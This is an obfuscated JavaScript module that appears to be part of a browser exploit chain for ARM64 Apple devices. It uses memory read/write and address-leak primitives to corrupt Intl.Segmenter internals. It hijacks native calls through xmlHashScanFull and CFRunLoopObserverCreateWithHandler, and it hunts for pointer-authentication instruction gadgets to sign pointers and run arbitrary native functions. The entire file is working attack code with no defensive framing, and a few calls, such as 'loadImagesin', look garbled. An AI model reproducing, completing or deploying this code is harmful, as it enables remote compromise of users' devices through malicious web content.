let r = {};
const K = globalResolve("1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0"),
  T = globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c"),
  {
    N: x,
    tn: W,
    nn: F,
    Ptr64: m,
    U: j,
    An: S,
    vn: O,
    T: l,
    v: o,
    I: u,
    B: s,
    K: R,
    O: L
  } = globalResolve("1ff010bb3e857e2b0383f1d9a1cf9f54e321fbb0");
r.Mh = function() {
  T.engine.memory, T.engine.En;
  const a = new ta;
  return new aa(a)
};
class aa {
  constructor(a) {
    this.fh = a, this.Cc = true, this.ib = this.fh.ib, this.ob = this.fh.ob, this.lb = this.fh.lb, this.tb = this.fh.tb
  }
  sc(a, t) {
    return K.Ptr64.ot(this.fh.sc(a.Nt(), t.Nt()))
  }
  oe(a, t) {
    return K.Ptr64.ot(this.fh.oe(a.Nt(), t.Nt()))
  }
  cc(a, t) {
    return K.Ptr64.ot(this.fh.cc(a.Nt(), t.Nt()))
  }
  ac(a, t) {
    return K.Ptr64.ot(this.fh.ac(a.Nt(), t.Nt()))
  }
  Ic(a, t, s) {
    return K.Ptr64.ot(this.fh.Nn.call({
      _h: a.Nt(),
      xh: t.Nt(),
      x1: s.Nt(),
      x2: j(0),
      wh: j(0),
      zh: j(0)
    }))
  }
}
class ta {
  constructor() {
    const a = T.engine.En;
    T.engine.memory;
    this.En = {
      ec: a.nl.ec
    }, this.Nn = new ha, this.Ph = new sa, this.Fh = {
      Hh: this.Ph.call({
        _h: this.En.ec
      })
    };
    {
      const t = a.nl.oc;
      let s = 0x10n,
        i = [(0xaa0003f1), (0xaa0803f0), (0xd503211f), 0x1400000c, (0xaa0003f1), (0xaa0803f0), (0xdac10a11), 0x14000008, (0xaa0003f1), (0xaa0803f0), (0xd503215f), 0x14000004, (0xaa0003f1), (0xaa0803f0), (0xdac10e11), (0xaa1103e0), (0xd65f03c0)],
        c = null;
      const h = s => a.rl.Kl(t, i, s);
      for (;;) {
        if (c = h(c), null === c) return null;
        if (c !== this.En.ec) break;
        c += j(0x4n * i.length)
      }
      if (null === c) return null;
      this.ib = m.ot(c), this.ob = m.ot(c + 1n * s), this.lb = m.ot(c + 2n * s), this.tb = m.ot(c + 3n * s)
    }
  }
  Sh(a, t, s) {
    T.engine.En, T.engine.memory;
    return this.Nn.call({
      _h: this.Fh.Hh,
      xh: t,
      x1: s & j(0xffffffffffff),
      x2: 1n,
      wh: s >> 48n & 0xFFFFn,
      zh: j(a)
    })
  }
  sc(a, t) {
    return this.Sh(0, a, t)
  }
  oe(a, t) {
    return this.Sh(1, a, t)
  }
  ac(a, t) {
    return this.Sh(2, a, t)
  }
  cc(a, t) {
    return this.Sh(3, a, t)
  }
}
class sa {
  constructor() {
    const a = T.engine.En,
      t = T.engine.memory;
    this.Ah = new la, this.Fh = {
      kh: this.Ah.Gh("xmlHashScanFull"),
      $l: a.nl.$l,
      Oh: this.Ah.Gh("CFRunLoopObserverCreateWithHandler"),
      Zl: a.nl.Zl
    };
    const s = S(this.Fh.Oh),
      i = a.rl.Ml(s, 0x80);
    if (4 !== i.length) throw new Error("");
    this.En = {
      uu: i[1],
      au: i[2]
    }, this.Bh = t.pa(32), this.Eh = t.pa(48), this.Rh = t.pa(0x300), this.Wh = new ia
  }
  call(a) {
    let t = 0;
    T.engine.En;
    const s = T.engine.memory,
      i = [[this.Bh, [[0, this.Eh], [8, 1], [12, 1]]], [this.Eh, [[0, 0], [8, 0], [16, 0], [24, 0], [32, this.Rh], [40, 1]]], [this.Rh, [[64, 0], [24, 0], [0x78, 0], [0x128, 0], [0x130, 0], [0x138, 0], [0x158, 0], [0x178, this.Fh.Oh], [0x88, 0], [0x180, 0], [0x188, 0], [0x190, 0]]]];
    for (const [a, t] of i)
      for (let [i, c] of t) null == c && (c = 0x0n), s.writeU64(j(a) + j(i), j(c));
    const c = s.readU64(this.En.uu),
      h = s.readU64(this.En.au);
    try {
      s.writeU64(this.En.uu, S(this.Fh.Zl)), s.writeU64(this.En.au, a._h);
      const i = this.Wh.call({
        _h: this.Fh.kh,
        xh: this.Bh,
        x1: this.Fh.$l,
        x2: 0x0n
      });
      t = s.readU64(i + 0x90n)
    } finally {
      s.writeU64(this.En.uu, c), s.writeU64(this.En.au, h)
    }
    return t
  }
}
class ia {
  constructor() {
    const a = T.engine.En,
      t = T.engine.memory;
    this.En = {
      Zl: a.nl.Zl,
      ql: a.nl.ql,
      Yl: a.nl.Yl,
      Wl: a.nl.Wl,
      $l: a.nl.$l,
      Ql: a.nl.Ql,
      Ka: a.nl.Ka
    }, this.Uh = t.pa(80), this.jh = t.pa(80), this.qh = t.pa(80), this.Rh = t.pa(0x300), this.Dh = t.pa(80), this.Jh = new ca
  }
  call(a) {
    T.engine.En;
    const t = T.engine.memory,
      s = [[this.qh, [[32, this.En.ql], [8, this.Dh], [48, this.Rh]]], [this.Dh, [[16, j(7444609979)]]], [this.Rh, [[64, 0], [24, 0], [0x78, 0], [0x128, 0], [0x130, 0], [0x138, 0], [0x158, 0], [0x178, this.En.Ql], [0x88, 0], [0x180, a.x1], [0x188, this.Uh], [0x190, j(0x1ccccccc)]]], [this.Uh, [[16, a._h], [8, a.xh], [48, a.x2]]]];
    for (const [a, i] of s)
      for (let [s, c] of i) null == c && (c = 0x0n), t.writeU64(j(a) + j(s), j(c));
    const i = t.readU64(this.En.Yl),
      c = t.readU64(this.En.Wl);
    try {
      t.writeU64(this.En.Yl, this.En.$l), t.writeU64(this.En.Wl, this.En.Zl), this.Jh.call(this.En.Ka, this.qh)
    } finally {
      t.writeU64(this.En.Yl, i), t.writeU64(this.En.Wl, c)
    }
    return t.readU64(this.Dh + 0x10n)
  }
}
class ca {
  constructor() {
    const a = T.engine.memory,
      t = new Intl.Segmenter("en", {
        nu: "sentence"
      }),
      s = [];
    for (let a = 0; a < 0x12c; a++) s.push("a");
    const i = s.loadImagesin(" ");
    t.segment(i);
    this.Nh = t, this.Qh = t.segment(i), this.Jb = a.pa(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.IMuONj)
  }
  call(a, t) {
    const s = T.engine.memory,
      i = this.Qh[Symbol.iterator](),
      c = (() => {
        const a = s.addrOfJS(i);
        return s.readU64(a + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.poHcKr))
      })(),
      h = c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.MqzmhP),
      l = s.readU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.ezbcB7)),
      n = s.readU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.YNPpX2)),
      o = s.readU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.pWvdyQ)),
      e = s.readU64(h + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.KdIBeK)),
      b = s.readU64(l + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.sS3pIv)),
      r = s.readU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.HI0NlH));
    {
      const a = s.readU32Raw(b + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.tCLyui)),
        t = s.readU32Raw(b + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.Le3A61)),
        i = 2 * (globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.KcwpPX + s.readU32Raw(b + j(t))),
        r = globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.LjzPLJ + i * a;
      if (r % 4 != 0) throw new Error("");
      const [f, d] = s.ka(i);
      for (let a = 0; a < r; a += 4) s.writeU32(d + j(a), s.readU32Raw(b + j(a)));
      const u = 2,
        _ = 4;
      s.writeU32(d + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.PpDlB4), _ | u);
      for (let i = 0; i < a; i++) {
        const a = d + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.NkCst2 + t * i);
        s.writeU32(a, 2);
        for (let i = 0; i < t; i++) s.Sa(a + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.XuxRwq + i), 0)
      }
      const [T, g] = s.ka(0xc0);
      s.writeU32(d + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.JROzse), 48);
      {
        const a = o + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.mpZaG6);
        for (let t = 0; t < 0x80; t++) s.writeU32(a + j(4 * t), 0xa0)
      }
      s.writeU64(l + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.sS3pIv), d), s.writeU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.HI0NlH), g), s.writeU32(n + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.BYDV96), (0xffffffff)), s.writeU32(h + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.bGq8I5), 0xa0);
      for (let a = 0; a < globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.IMuONj; a += 4) s.writeU32(this.Jb + j(a), s.readU32Raw(e) + a)
    }
    s.writeU64(h + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.KdIBeK), this.Jb);
    try {
      s.writeU64(this.Jb + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.okYhnZ), a), s.writeU64(h + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.wshMzH), t), i.next().value
    } finally {
      s.writeU64(h + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.KdIBeK), e), s.writeU64(c + j(globalResolve("6b57ca3347345883898400ea4318af3b9aa1dc5c").engine.config.HI0NlH), r)
    }
  }
}
class ha {
  constructor() {
    T.engine.En;
    const a = T.engine.memory;
    this.Ah = new la, this.Fh = {
      kh: this.Ah.Gh("xmlHashScanFull")
    }, this.Bh = a.pa(32), this.Eh = a.pa(48), this.Wh = new ia
  }
  call(a) {
    T.engine.En;
    const t = T.engine.memory;
    if (0x0n === a.xh) throw new Error("");
    const s = [[this.Bh, [[0, this.Eh], [8, 1], [12, 1]]], [this.Eh, [[0, 0], [8, a.x2], [16, a.wh], [24, a.zh], [32, a.xh], [40, 1]]]];
    for (const [a, i] of s)
      for (let [s, c] of i) null == c && (c = 0x0n), t.writeU64(j(a) + j(s), j(c));
    return this.Wh.call({
      _h: this.Fh.kh,
      xh: this.Bh,
      x1: a._h,
      x2: a.x1
    })
  }
}
class la {
  constructor() {
    const a = T.engine.En;
    T.engine.memory;
    this.Fh = {
      fc: a.nl.fc
    }, this.Wh = new ia
  }
  Gh(a) {
    T.engine.En;
    const t = T.engine.memory,
      [s, i] = t.Ta(a);
    return this.Wh.call({
      _h: this.Fh.fc,
      xh: i,
      x1: 0x0n,
      x2: 0x0n
    })
  }
}
return r;
